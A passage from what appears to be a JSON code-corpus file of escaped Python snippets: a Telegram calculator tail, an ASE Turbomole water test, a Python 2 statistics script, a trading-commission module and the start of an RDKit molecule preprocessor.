\"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "477": "# type: ignore\nfrom ase.calculators.turbomole import Turbomole\nfrom ase.build import molecule\n\ndef test_turbomole_h2o():\n    mol = molecule('H2O')\n\n    params = {\n        'title': 'water',\n        'task': 'geometry optimization',\n        'use redundant internals': True,\n        'basis set name': 'def2-SV(P)',\n        'total charge': 0,\n        'multiplicity': 1,\n        'use dft': True,\n        'density functional': 'b3-lyp',\n        'use resolution of identity': True,\n        'ri memory': 1000,\n        'force convergence': 0.001,\n        'geometry optimization iterations': 50,\n        'scf iterations': 100\n    }\n\n    calc = Turbomole(**params)\n    mol.calc = calc\n    calc.calculate(mol)\n    assert calc.converged\n\n    # use the get_property() method\n    print(calc.get_property('energy', mol, False))\n    print(calc.get_property('forces', mol, False))\n    print(calc.get_property('dipole', mol, False))\n\n    # use the get_results() method\n    results = calc.get_results()\n    print(results['molecular orbitals'])\n\n    # use the __getitem__() method\n    print(calc['results']['molecular orbitals'])\n    print(calc['results']['geometry optimization history'])\n\n    # perform a normal mode calculation with the optimized structure\n\n    params.update({\n        'task': 'normal mode analysis',\n        'density convergence': 1.0e-7\n    })\n\n    calc = Turbomole(**params)\n    mol.calc = calc\n    calc.calculate(mol)\n\n    print(calc['results']['vibrational spectrum'])\n    print(calc.todict(skip_default=False))\n", "478": "#!/usr/bin/env python2\n# -*- coding: UTF-8 -*-\n\nfrom random import gauss, random\nfrom math import log, ceil\nfrom numpy import *\n\n\ndef MCint_vec(f, a, b, n):\n    x = random.uniform(a, b, n)\n    s = sum(f(x))\n    I = (float(b - a) / n) * s\n    return I\n\n\ndefault_count_of_list = 100\ngen_sel = 500\nseparator = \"----------------------------------------\"\n\n\ndef __main__():\n    print separator\n\n    main_list = []\n    # if file exists\n    try:\n        print u\"\u041f\u043e\u043f\u044b\u0442\u043a\u0430 \u0447\u0442\u0435\u043d\u0438\u044f \u0438\u0437 \u0444\u0430\u0439\u043b\u0430 \\\"input.txt\\\"\"\n        input_f = open(\"input.txt\")\n        for line in input_f:\n            for word in line.split():\n                main_list.append(float(word))\n        print u\"\u0424\u0430\u0439\u043b \u0441\u0447\u0438\u0442\u0430\u043d.\"\n    # else generates new list\n    except IOError:\n        print u\"\u0424\u0430\u0439\u043b \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d. \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u043f\u0440\u043e\u0438\u0437\u0432\u043e\u043b\u044c\u043d\u043e\u0439 \u043f\u043e\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u0438.\"\n        for i in xrange(default_count_of_list):\n            main_list.append(abs(gauss(0, 1) * 4))\n\n    main_list.sort()\n    count = len(main_list)\n\n    # m - count of intervals\n    # k - size of each interval\n    m = 1 + 3.3221 * log(count) / log(10)\n    m = int(ceil(m))\n    k = (main_list[-1] - main_list[0]) / float(m)\n\n    # calculates all needed parameters\n    intervals_accum = calc_intervals_accum(main_list, m, k)\n    intervals = calc_intervals(main_list, intervals_accum, m)\n    x = calc_x(main_list, m, k)\n    average = calc_average(x, intervals, count, m)\n    median = calc_median(main_list)\n    modes = calc_modes(x, intervals, m)\n    lin_average = calc_lin_average(x, intervals, average, count, m)\n    dispersion = calc_dispersion(x, intervals, average, count, m)\n    sq_average = calc_sq_average(x, intervals, average, count, m)\n    variation = calc_variation(x, intervals, average, count, m)\n    assim = calc_assim(x, intervals, average, count, m)\n    excess = calc_excess(x, intervals, average, count, m)\n    average_rep = calc_average_rep(x, intervals, average, count, m)\n    average_norep = calc_average_norep(x, intervals, average, count, m)\n\n    # prints all information about list\n    print u\"\u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0438\u043d\u0442\u0435\u0440\u0432\u0430\u043b\u043e\u0432 = \", m\n    print u\"\u0420\u0430\u0437\u043c\u0435\u0440 \u0438\u043d\u0442\u0435\u0440\u0432\u0430\u043b\u043e\u0432 = %.3f\" % k\n    print u\"\u041e\u0441\u043d\u043e\u0432\u043d\u044b\u0435 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b \u043f\u0430\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u0438:\"\n\n    interval = main_list[0]\n    for i in xrange(m):\n        print '%2d %7.3f %7.3f - %6.3f %5d %5d %8.2f %8.2f' \\\n        % (i + 1, x[i], interval, interval + k,\\\n        intervals[i], intervals_accum[i], intervals[i] / float(count), \\\n        intervals_accum[i] / float(count))\n        interval += k\n\n    print u\"\u0421\u0440\u0435\u0434\u043d\u0435\u0435 \u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 = %.3f\" % average\n    print u\"\u041c\u0435\u0434\u0438\u0430\u043d\u0430 = %.3f\" % median\n\n    print u\"\u041c\u043e\u0434\u044b:\"\n    for i in xrange(len(modes)):\n        print \"%11.3f\" % modes[i]\n\n    print u\"\u0420\u0430\u0437\u043c\u0430\u0445 = %.3f\" % (main_list[-1] - main_list[0])\n    print u\"\u0421\u0440\u0435\u0434\u043d\u0435\u0435 \u043b\u0438\u043d\u0435\u0439\u043d\u043e\u0435 \u043e\u0442\u043a\u043b\u043e\u043d\u0435\u043d\u0438\u0435 = %.3f\" % lin_average\n    print u\"\u0414\u0438\u0441\u043f\u0435\u0440\u0441\u0438\u044f = %.3f\" % dispersion\n    print u\"\u0421\u0440\u0435\u0434\u043d\u0435\u0435 \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u043e\u0442\u043a\u043b\u043e\u043d\u0435\u043d\u0438\u0435 = %.3f\" % sq_average\n    print u\"\u041a\u043e\u044d\u0444\u0444\u0438\u0446\u0438\u0435\u043d\u0442 \u0432\u0430\u0440\u0438\u0430\u0446\u0438\u0438 = %.3f\" % variation\n    print u\"\u041a\u043e\u044d\u0444\u0444\u0438\u0446\u0438\u0435\u043d\u0442 \u0430\u0441\u0438\u043c\u043c\u0435\u0442\u0440\u0438\u0438 = %.3f\" % assim\n    print u\"\u0415\u043a\u0441\u0446\u0435\u0441 = %.3f\" % excess\n    level = 7.33\n    print u\"\u041e\u0446\u0435\u043d\u043a\u0430 \u0433\u0435\u043d\u0435\u0440\u0430\u043b\u044c\u043d\u043e\u0439 \u0447\u0430\u0441\u0442\u043e\u0441\u0442\u0438 P(X>=%.3f) = %.3f\" % (level, calc_freq(main_list, level))\n    print u\"\u0421\u0440\u0435\u0434\u043d\u0435\u0435 \u043f\u043e\u0432\u0442\u043e\u0440\u043d\u043e\u0439 \u0432\u044b\u0431\u043e\u0440\u043a\u0438 = %.3f\" % average_rep\n    print u\"\u0421\u0440\u0435\u0434\u043d\u0435\u0435 \u0431\u0435\u0437\u043f\u043e\u0432\u0442\u043e\u0440\u043d\u043e\u0439 \u0432\u044b\u0431\u043e\u0440\u043a\u0438 = %.3f\" % average_norep\n    print separator\n    print\n\n\ndef calc_intervals_accum(main_list, m, k):\n    \"\"\"Accumulative sum of list.\"\"\"\n\n    count = len(main_list)\n    intervals_accum = [0] * m\n    interval = main_list[0] + k\n    for i in xrange(m):\n        for j in xrange(count):\n            if main_list[j] <= interval:\n                intervals_accum[i] += 1\n        interval += k\n    return intervals_accum\n\n\ndef calc_intervals(main_list, intervals_accum, m):\n    \"\"\"Calculates intervals.\"\"\"\n\n    intervals = [0] * m\n    intervals[0] = intervals_accum[0]\n    for i in xrange(1, m):\n        intervals[i] = intervals_accum[i] - intervals_accum[i - 1]\n    return intervals\n\n\ndef calc_x(main_list, m, k):\n    \"\"\"Calculates x values.\"\"\"\n\n    x = [main_list[0]]\n    for i in xrange(1, m):\n        x.append(x[i - 1] + k)\n    return x\n\n\ndef calc_average(x, intervals, count, m):\n    \"\"\"Calculates average.\"\"\"\n\n    average = 0\n    for i in xrange(m):\n        average += x[i] * intervals[i]\n    return average / float(count)\n\n\ndef calc_median(main_list):\n    \"\"\"Calculates median.\"\"\"\n\n    count = len(main_list)\n    if count % 2 == 0:\n        median = (main_list[count / 2] + main_list[count / 2 + 1]) / 2\n    else:\n        median = main_list[count / 2]\n    return median\n\n\ndef calc_modes(x, intervals, m):\n    \"\"\"Calculates modas.\"\"\"\n\n    modes = []\n    maximum = x[0]\n    for i in xrange(m):\n        if intervals[i] > maximum:\n            maximum = intervals[i]\n            del modes\n            modes = [x[i]]\n        elif intervals[i] == maximum:\n            modes.append(x[i])\n\n    return modes\n\n\ndef calc_lin_average(x, intervals, average, count, m):\n    \"\"\"Calculates lin_average.\"\"\"\n\n    lin_average = 0\n    for i in xrange(m):\n        lin_average += abs(x[i] - average) * intervals[i]\n    return lin_average / float(count)\n\n\ndef calc_dispersion(x, intervals, average, count, m):\n    \"\"\"Calculates dispersion.\"\"\"\n\n    dispersion = 0\n    for i in xrange(m):\n        dispersion += (x[i] - average) ** 2 * intervals[i]\n    return dispersion / float(count)\n\n\ndef calc_sq_average(x, intervals, average, count, m):\n    \"\"\"Calculates square average.\"\"\"\n    return calc_dispersion(x, intervals, average, count, m) ** 0.5\n\n\ndef calc_variation(x, intervals, average, count, m):\n    \"\"\"Calculates variation.\"\"\"\n    return  calc_sq_average(x, intervals, average, count, m) / average\n\n\ndef calc_assim(x, intervals, average, count, m):\n    \"\"\"Calculates assimetrion.\"\"\"\n    return center_moment(x, intervals, average, count, m, 3) / \\\n    calc_sq_average(x, intervals, average, count, m) ** 3\n\n\ndef calc_excess(x, intervals, average, count, m):\n    \"\"\"Calculates excess.\"\"\"\n    return center_moment(x, intervals, average, count, m, 4) / \\\n    calc_sq_average(x, intervals, average, count, m) ** 4 - 3\n\n\ndef start_moment(x, intervals, count, m, k):\n    \"\"\"Calculate start moment.\"\"\"\n\n    result = 0\n    for i in xrange(m):\n        result += x[i] ** k * intervals[i]\n    return result / float(count)\n\n\ndef center_moment(x, intervals, average, count, m, k):\n    \"\"\"Calculates center moment.\"\"\"\n\n    result = 0\n    for i in xrange(m):\n        result += (x[i] - average) \\\n        ** k * intervals[i]\n    return result / float(count)\n\n\ndef calc_freq(main_list, level):\n        \"\"\"Calculates frequrensy.\"\"\"\n\n        result = 0.\n        for i in main_list:\n                if i >= level:\n                        result += 1\n\n        return result / len(main_list)\n\n\ndef calc_average_rep(x, intervals, average, count, m):\n        \"\"\"Calculates average repetition.\"\"\"\n        return (calc_dispersion(x, intervals, average, count, m) / count) ** 0.5\n\n\ndef calc_average_norep(x, intervals, average, count, m):\n        \"\"\"Calculates averege without repetition.\"\"\"\n        return calc_average_rep(x, intervals, average, count, m) * (1. - count / gen_sel)\n\n__main__()\n", "479": "# -*- encoding:utf-8 -*-\n\"\"\"\n    \u624b\u7eed\u8d39\u6a21\u5757\n\"\"\"\n\nfrom __future__ import print_function\nfrom __future__ import absolute_import\nfrom __future__ import division\n\nimport logging\nfrom contextlib import contextmanager\n\nimport numpy as np\nimport pandas as pd\n\nfrom ..MarketBu.ABuSymbolFutures import AbuFuturesCn\nfrom ..CoreBu.ABuFixes import partial\nfrom ..CoreBu import ABuEnv\nfrom ..CoreBu.ABuEnv import EMarketTargetType\nfrom .ABuOrder import OrderMarket\nfrom ..MarketBu import ABuMarket\n\n__author__ = '\u963f\u5e03'\n__weixin__ = 'abu_quant'\n\n\n# noinspection PyUnusedLocal\ndef calc_commission_us(trade_cnt, price):\n    \"\"\"\n    \u7f8e\u80a1\u8ba1\u7b97\u4ea4\u6613\u8d39\u7528\uff1a\u6bcf\u80a10.01\uff0c\u6700\u4f4e\u6d88\u8d392.99\n    :param trade_cnt: \u4ea4\u6613\u7684\u80a1\u6570\uff08int\uff09\n    :param price: \u6bcf\u80a1\u7684\u4ef7\u683c\uff08\u7f8e\u5143\uff09\uff08\u6682\u4e0d\u4f7f\u7528\uff0c\u53ea\u662f\u4fdd\u6301\u63a5\u53e3\u7edf\u4e00\uff09\n    :return: \u8ba1\u7b97\u7ed3\u679c\u624b\u7eed\u8d39\n    \"\"\"\n    # \u6bcf\u80a1\u624b\u7eed\u8d390.01\n    commission = trade_cnt * 0.01\n    if commission < 2.99:\n        # \u6700\u4f4e\u6d88\u8d392.99\n        commission = 2.99\n    return commission\n\n\ndef calc_commission_cn(trade_cnt, price):\n    \"\"\"\n    a\u80a1\u8ba1\u7b97\u4ea4\u6613\u8d39\u7528\uff1a\u5370\u82b1\u7a0e\uff0b\u4f63\u91d1\uff1a \u5370\u82b1\u7a0e\u4e073\uff0c\u4f63\u91d1\u4e072.5\n    :param trade_cnt: \u4ea4\u6613\u7684\u80a1\u6570\uff08int\uff09\n    :param price: \u6bcf\u80a1\u7684\u4ef7\u683c\uff08\u4eba\u6c11\u5e01\uff09\n    :return: \u8ba1\u7b97\u7ed3\u679c\u624b\u7eed\u8d39\n    \"\"\"\n    cost = trade_cnt * price\n    # \u5370\u82b1\u7a0e\u4e073\uff0c\n    tax = cost * 0.0003\n    # \u4f63\u91d1\u4e072.5\n    commission = cost * 0.00025\n    # \u4f63\u91d1\u6700\u4f4e5\n    commission = commission if commission > 5 else 5\n    commission += tax\n    return commission\n\n\ndef calc_commission_hk(trade_cnt, price):\n    \"\"\"\n    h\u80a1\u8ba1\u7b97\u4ea4\u6613\u8d39\u7528\uff1a\u5370\u82b1\u7a0e\uff0b\u4f63\u91d1\uff1a \u4f63\u91d1\u5343\u5206\u4e4b\u4e8c\uff0c\u5370\u82b1\u7a0e\u5343\u5206\u4e4b\u4e00\n    :param trade_cnt: \u4ea4\u6613\u7684\u80a1\u6570\uff08int\uff09\n    :param price: \u6bcf\u80a1\u7684\u4ef7\u683c\uff08\u4eba\u6c11\u5e01\uff09\n    :return: \u8ba1\u7b97\u7ed3\u679c\u624b\u7eed\u8d39\n    \"\"\"\n    cost = trade_cnt * price\n    # \u5370\u82b1\u7a0e\u5343\u5206\u4e4b\u4e00\n    tax = cost * 0.001\n    # \u4f63\u91d1\u5343\u5206\u4e4b\u4e8c\uff0c\n    commission = cost * 0.002\n    commission += tax\n    return commission\n\n\ndef calc_commission_tc(trade_cnt, price):\n    \"\"\"\n    \u5e01\u7c7b\u8ba1\u7b97\u4ea4\u6613\u8d39\u7528\uff1a\u53ea\u7b80\u5355\u8ba1\u7b97\u624b\u7eed\u8d39\uff0c\u53cc\u5411\u90fd\u4f7f\u7528\u6d41\u901a\u5e01\u8ba1\u7b97\u624b\u7eed\u8d39\uff0c\u4e0d\u6d89\u53ca\u5356\u51fa\u4f7f\u7528\u5e01\u7c7b\u7684\u624b\u7eed\u8ba1\u7b97\uff0c\n    \u5982\u9700\u8981\u66f4\u7cbe\u786e\u8ba1\u7b97\uff0c\u8bf7\u4f7f\u7528\u81ea\u5b9a\u4e49\u8ba1\u7b97\u8d39\u7387\uff0c\u5373\u5728AbuCommission\u521d\u59cb\u5316\u4e2d\u81ea\u5b9a\u4e49\u8ba1\u7b97\u624b\u7eed\u8d39\u7684\u65b9\u6cd5\n    :param trade_cnt: \u4ea4\u6613\u7684\u5e01\u4e2a\u6570\uff08int\uff09\n    :param price: \u6bcf\u5e01\u7684\u4ef7\u683c\uff08\u4eba\u6c11\u5e01\uff09\n    :return: \u8ba1\u7b97\u7ed3\u679c\u624b\u7eed\u8d39\n    \"\"\"\n    cost = trade_cnt * price\n    # \u53cc\u5411\u90fd\u4f7f\u7528\u6d41\u901a\u5e01\u8ba1\u7b97\u624b\u7eed\u8d39\uff0c\u5343\u5206\u4e4b2\n    commission = cost * 0.002\n    return commission\n\n\n# noinspection PyUnusedLocal\ndef calc_commission_futures_cn(trade_cnt, price, symbol_name):\n    \"\"\"\n    \u671f\u8d27\u8ba1\u7b97\u4ea4\u6613\u8d39\u7528\uff1a\u9996\u5148\u67e5\u8be2\u5bf9\u5e94\u5546\u54c1\u5355\u4f4d\u4ea4\u6613\u91cf\uff08\u6bcf\u624b\u5355\u4f4d\u6570\u91cf\uff09\uff0c\u4ee5\u53ca\u6bcf\u624b\u624b\u7eed\u8d39\uff0c\u518d\u8ba1\u7b97\u5bf9\u5e94\u624b\u7eed\u8d39\n    :param trade_cnt: \u4ea4\u6613\u7684\u5355\u4f4d\u6570\u91cf\uff08int\uff09\n    :param price: \u4e70\u5165\u7684\u4ef7\u683c\uff08\u6682\u4e0d\u4f7f\u7528\uff0c\u53ea\u662f\u4fdd\u6301\u63a5\u53e3\u7edf\u4e00\uff09\n    :param symbol_name: \u5546\u54c1\u67e5\u8be2symbol\n    :return: \u8ba1\u7b97\u7ed3\u679c\u624b\u7eed\u8d39\n    \"\"\"\n    min_unit = 10\n    commission_unit = 10\n    # \u67e5\u8be2\u5546\u54c1\u671f\u8d27\u7684\u5bf9\u5e94df\n    q_df = AbuFuturesCn().query_symbol(symbol_name)\n    if q_df is not None:\n        # \u6bcf\u624b\u5355\u4f4d\u6570\u91cf\n        min_unit = q_df.min_unit.values[0]\n        # \u6bcf\u624b\u4ea4\u6613\u624b\u7eed\u8d39\n        commission_unit = q_df.commission.values[0]\n    commission = trade_cnt / min_unit * commission_unit\n    return commission\n\n\ndef calc_options_us(trade_cnt, price):\n    \"\"\"\n    \u7f8e\u80a1\u671f\u6743\uff1a\u5dee\u522b\u5f88\u5927\uff0c\u6700\u597d\u5916\u90e8\u81ea\u5b9a\u4e49\u81ea\u5df1\u7684\u8ba1\u7b97\u65b9\u6cd5\uff0c\u8fd9\u91cc\u53ea\u7b80\u5355\u6309\u71670.0035\u8ba1\u7b97\n    :param trade_cnt: \u4ea4\u6613\u7684\u80a1\u6570\uff08int\uff09\n    :param price: \u6bcf\u80a1\u7684\u4ef7\u683c\uff08\u7f8e\u5143\n    :return: \u8ba1\u7b97\u7ed3\u679c\u624b\u7eed\u8d39\n    \"\"\"\n    cost = trade_cnt * price\n    # \u7f8e\u80a1\u671f\u6743\u5404\u4e2a\u5238\u5546\u4ee5\u53ca\u4e2a\u4eba\u65b9\u5f0f\u5dee\u522b\u5f88\u5927\uff0c\u6700\u597d\u5916\u90e8\u81ea\u5b9a\u4e49\u8ba1\u7b97\u65b9\u6cd5\uff0c\u8fd9\u91cc\u53ea\u7b80\u5355\u6309\u71670.0035\u8ba1\u7b97\n    commission = cost * 0.0035\n    return commission\n\n\ndef calc_commission_futures_global(trade_cnt, price):\n    \"\"\"\n    \u56fd\u9645\u671f\u8d27\uff1a\u5dee\u522b\u5f88\u5927\uff0c\u6700\u597d\u5916\u90e8\u81ea\u5b9a\u4e49\u81ea\u5df1\u7684\u8ba1\u7b97\u65b9\u6cd5\uff0c\u8fd9\u91cc\u53ea\u7b80\u5355\u6309\u71670.002\u8ba1\u7b97\n    :param trade_cnt: \u4ea4\u6613\u7684\u80a1\u6570\uff08int\uff09\n    :param price: \u6bcf\u80a1\u7684\u4ef7\u683c\uff08\u7f8e\u5143\uff09\n    :return: \u8ba1\u7b97\u7ed3\u679c\u624b\u7eed\u8d39\n    \"\"\"\n    cost = trade_cnt * price\n    # \u56fd\u9645\u671f\u8d27\u5404\u4e2a\u5238\u5546\u4ee5\u53ca\u4ee3\u7406\u65b9\u5f0f\u5dee\u522b\u5f88\u5927\uff0c\u6700\u597d\u5916\u90e8\u81ea\u5b9a\u4e49\u8ba1\u7b97\u65b9\u6cd5\uff0c\u8fd9\u91cc\u53ea\u7b80\u5355\u6309\u71670.002\u8ba1\u7b97\n    commission = cost * 0.002\n    return commission\n\n\nclass AbuCommission(object):\n    \"\"\"\u4ea4\u6613\u624b\u7eed\u8d39\u8ba1\u7b97\uff0c\u8bb0\u5f55\uff0c\u5206\u6790\u7c7b\uff0c\u5728AbuCapital\u4e2d\u5b9e\u4f8b\u5316\"\"\"\n\n    def __init__(self, commission_dict):\n        \"\"\"\n        :param commission_dict: \u4ee3\u8868\u7528\u6237\u81ea\u5b9a\u4e49\u624b\u7eed\u8d39\u8ba1\u7b97dict\u5bf9\u8c61\uff0c\n                                key\uff1abuy_commission_func\uff0c \u4ee3\u8868\u7528\u6237\u81ea\u5b9a\u4e49\u4e70\u5165\u8ba1\u7b97\u8d39\u7528\u65b9\u6cd5\n                                key\uff1asell_commission_func\uff0c\u4ee3\u8868\u7528\u6237\u81ea\u5b9a\u4e49\u5356\u51fa\u8ba1\u7b97\u8d39\u7528\u65b9\u6cd5\n        \"\"\"\n        self.commission_dict = commission_dict\n        # \u5bf9\u8c61\u5185\u90e8\u8bb0\u5f55\u4ea4\u6613\u7684pd.DataFrame\u5bf9\u8c61\uff0c\u5217\u8bbe\u5b9a\n        self.df_columns = ['type', 'date', 'symbol', 'commission']\n        # \u6784\u5efa\u624b\u7eed\u8d39\u8bb0\u5f55pd.DataFrame\u5bf9\u8c61commission_df\n        self.commission_df = pd.DataFrame(columns=self.df_columns)\n\n    def __str__(self):\n        \"\"\"\u6253\u5370\u5bf9\u8c61\u663e\u793a\uff1a\u5982\u679c\u6709\u624b\u7eed\u8d39\u8bb0\u5f55\uff0c\u6253\u5370\u8bb0\u5f55df\uff0c\u5426\u5219\u6253\u5370commission_df.info\"\"\"\n        if self.commission_df.shape[0] == 0:\n            return str(self.commission_df.info())\n        return str(self.commission_df)\n\n    __repr__ = __str__\n\n    # noinspection PyMethodMayBeStatic\n    def _commission_enter(self, a_order):\n        \"\"\"\n        \u901a\u8fc7a_order\u5bf9\u8c61\u8fdb\u884c\u4ea4\u6613\u5bf9\u8c61\u5e02\u573a\u7c7b\u578b\u8f6c\u6362\uff0c\u5206\u914d\u5bf9\u5e94\u624b\u7eed\u8d39\u8ba1\u7b97\u65b9\u6cd5\n        :param a_order: \u4ea4\u6613\u5355\u5bf9\u8c61AbuOrder\u5b9e\u4f8b\n        :return:\n        \"\"\"\n\n        # \u5982\u679c\u4f7f\u7528env\u4e2d\u7edf\u4e00\u8bbe\u7f6e\uff0c\u5373\u4e0d\u9700\u8981\u901a\u8fc7OrderMarket\u5bf9\u5355\u5b50\u67e5\u8be2\u5e02\u573a\uff0c\u63d0\u9ad8\u8fd0\u884c\u6548\u7387\uff0c\u8be6ABuMarket\n        market = ABuEnv.g_market_target if ABuMarket.g_use_env_market_set \\\n            else OrderMarket(a_order).symbol_market\n        # \u4e0d\u540c\u7684\u5e02\u573a\u4e0d\u540c\u7684\u8ba1\u7b97\u624b\u7eed\u8d39\u65b9\u6cd5\n        if market == EMarketTargetType.E_MARKET_TARGET_US:\n            # \u7f8e\u80a1\n            calc_commission_func = calc_commission_us\n        elif market == EMarketTargetType.E_MARKET_TARGET_CN:\n            # a\u80a1\n            calc_commission_func = calc_commission_cn\n        elif market == EMarketTargetType.E_MARKET_TARGET_HK:\n            # h\u80a1\n            calc_commission_func = calc_commission_hk\n        elif market == EMarketTargetType.E_MARKET_TARGET_TC:\n            # \u5e01\u7c7b\n            calc_commission_func = calc_commission_tc\n        elif market == EMarketTargetType.E_MARKET_TARGET_FUTURES_CN:\n            # \u671f\u8d27\n            calc_commission_func = partial(calc_commission_futures_cn, symbol_name=a_order.buy_symbol)\n        elif market == EMarketTargetType.E_MARKET_TARGET_OPTIONS_US:\n            # \u7f8e\u80a1\u671f\u6743\n            calc_commission_func = calc_options_us\n        elif market == EMarketTargetType.E_MARKET_TARGET_FUTURES_GLOBAL:\n            # \u56fd\u9645\u671f\u8d27\n            calc_commission_func = calc_commission_futures_global\n        else:\n            raise TypeError('buy_stock market error!!!')\n        return calc_commission_func\n\n    @contextmanager\n    def buy_commission_func(self, a_order):\n        \"\"\"\n        \u5916\u90e8\u7528with as \u8fd4\u56de\u7684list\u4e2d\u9700\u8981\u52a0\u5165\u8ba1\u7b97\u7684\u6700\u7ec8\u7ed3\u679c\uff0c\u5426\u5219\u4e0d\u8fdb\u884c\u5185\u90e8\u4ea4\u6613\u8d39\u7528\u8bb0\u5f55\n        :param a_order: \u4e70\u5355\u5bf9\u8c61AbuOrder\u5b9e\u4f8b\n        \"\"\"\n        if self.commission_dict is not None and 'buy_commission_func' in self.commission_dict:\n            # \u5982\u679c\u6709\u81ea\u5b9a\u4e49\u8ba1\u7b97\u4ea4\u6613\u8d39\u7684\u65b9\u6cd5\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684\n            buy_func = self.commission_dict['buy_commission_func']\n        else:\n            buy_func = self._commission_enter(a_order)\n\n        # \u4f7f\u7528list\u56e0\u4e3a\u662f\u53ef\u53d8\u7c7b\u578b\uff0c\u9700\u8981\u5c06\u5916\u9762\u7684\u7ed3\u679c\u5e26\u56de\u6765\n        commission_list = list()\n        yield buy_func, commission_list\n\n        # \u5982\u679c\u6709\u5916\u90e8\u6709append\uff0c\u8bf4\u660e\u9700\u8981\u8bb0\u5f55\u624b\u7eed\u8d39\uff0c\u4e14\u6267\u884c\u8ba1\u7b97\u6210\u529f\n        if len(commission_list) == 1:\n            commission = commission_list[0]\n            # \u5c06\u4e70\u5355\u5bf9\u8c61AbuOrder\u5b9e\u4f8b\u4e2d\u7684\u6570\u636e\u8f6c\u6362\u6210\u4ea4\u6613\u8bb0\u5f55\u9700\u8981\u7684np.array\u5bf9\u8c61\n            record = np.array(['buy', a_order.buy_date, a_order.buy_symbol, commission]).reshape(1, 4)\n            record_df = pd.DataFrame(record, columns=self.df_columns)\n            self.commission_df = self.commission_df.append(record_df)\n        else:\n            logging.info('buy_commission_func calc error')\n\n    @contextmanager\n    def sell_commission_func(self, a_order):\n        \"\"\"\n        \u5916\u90e8\u7528with as \u8fd4\u56de\u7684list\u4e2d\u9700\u8981\u52a0\u5165\u8ba1\u7b97\u7684\u6700\u7ec8\u7ed3\u679c\uff0c\u5426\u5219\u4e0d\u8fdb\u884c\u5185\u90e8\u4ea4\u6613\u8d39\u7528\u8bb0\u5f55\n        :param a_order: \u5356\u5355\u5bf9\u8c61AbuOrder\u5b9e\u4f8b\n        \"\"\"\n        if self.commission_dict is not None and 'sell_commission_func' in self.commission_dict:\n            # \u5982\u679c\u6709\u81ea\u5b9a\u4e49\u8ba1\u7b97\u4ea4\u6613\u8d39\u7684\u65b9\u6cd5\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684\n            sell_func = self.commission_dict['sell_commission_func']\n        else:\n            sell_func = self._commission_enter(a_order)\n        # \u4f7f\u7528list\u56e0\u4e3a\u662f\u53ef\u53d8\u7c7b\u578b\uff0c\u9700\u8981\u5c06\u5916\u9762\u7684\u7ed3\u679c\u5e26\u56de\u6765\n        commission_list = list()\n\n        yield sell_func, commission_list\n\n        if len(commission_list) == 1:\n            commission = commission_list[0]\n            # \u5c06\u5356\u5355\u5bf9\u8c61AbuOrder\u5b9e\u4f8b\u4e2d\u7684\u6570\u636e\u8f6c\u6362\u6210\u4ea4\u6613\u8bb0\u5f55\u9700\u8981\u7684np.array\u5bf9\u8c61\n            record = np.array(['sell', a_order.sell_date, a_order.buy_symbol, commission]).reshape(1, 4)\n            record_df = pd.DataFrame(record, columns=self.df_columns)\n            self.commission_df = self.commission_df.append(record_df)\n        else:\n            logging.info('sell_commission_func calc error!!!')\n", "480": "import pandas as pd\nimport numpy as np\nimport subprocess\nfrom rdkit import Chem\nfrom rdkit.Chem import Descriptors, rdMolDescriptors\nimport os\nfrom rdkit.Chem import ChemicalFeatures, rdMolChemicalFeatures\nfrom rdkit.Chem.rdMolChemicalFeatures import MolChemicalFeatureFactory\nfrom rdkit import RDConfig\nfrom rdkit.Chem.AllChem import EmbedMolecule\nfrom sklearn.utils import shuffle\nimport pickle \nimport subprocess\nimport gnn_tools as gnn\nimport time\nimport re\n\ndef preprocessData(df, end, shuffle1): \n    if (1 == shuffle1):\n        df = shuffle(df)  \n    df = df.reset_index(drop=True)\n    df = df[:end]    \n    df_reduced, mol_list, legends = get_molecules(df)\n    print(\"Size of original dataframe =\",len(df))\n    print(\"Size of reduced dataframe =\", len(df_reduced), \"(excluding the cases that could not be processed)\")   \n    with open(\"../data/mol_list\", \"wb\") as fp:\n        pickle.dump(mol_list, fp)\n    return(df_reduced, mol_list)\n\ndef get_molecules(dataframe):\n    dataframe_reduced = dataframe\n    dataframe_rejected = pd.DataFrame()\n    nbrStruc = dataframe.shape[0]\n    mol_list = []\n    legends = []\n    for i in range(nbrStruc):\n        refcode = dataframe.at[i,\"refcode_csd\"]\n        #print(refcode)       \n        smile = dataframe.at[i,\"smiles\"]\n        #print(i, refcode, \"smile =\", smile)\n        # NOW TRY TO CONVERT SMILE INTO MOLECULE\n        # THERE COULD BE SOME PROBLEMS DOING THIS CONVERSION\n        # WE NEED TO HANDLE THE EXCEPTIONS\n\n        if smile is None:\n            print(\"\\n\\n\", i, refcode)\n            dataframe_rejected = pd.concat([dataframe_rejected, dataframe_reduced[dataframe_reduced.refcode_csd == refcode]])\n            dataframe_reduced = dataframe_reduced[dataframe_reduced.refcode_csd != refcode]\n            dataframe_reduced = dataframe_reduced.reset_index(drop=True)\n            print(\"Smile code is not provided. Droping it from the dataframe\")\n        else:\n            mol = Chem.MolFromSmiles(smile)\n        \n            if mol is None:\n                print(\"\\n\\n\", i, refcode)\n                dataframe_rejected = pd.concat([dataframe_rejected, dataframe_reduced[dataframe_reduced.refcode_csd == refcode]])\n                dataframe_reduced = dataframe_reduced[dataframe_reduced.refcode_csd != refcode]\n                dataframe_reduced = dataframe_reduced.reset_index(drop=True)\n                print(\"problem converting molecule. Droping it from 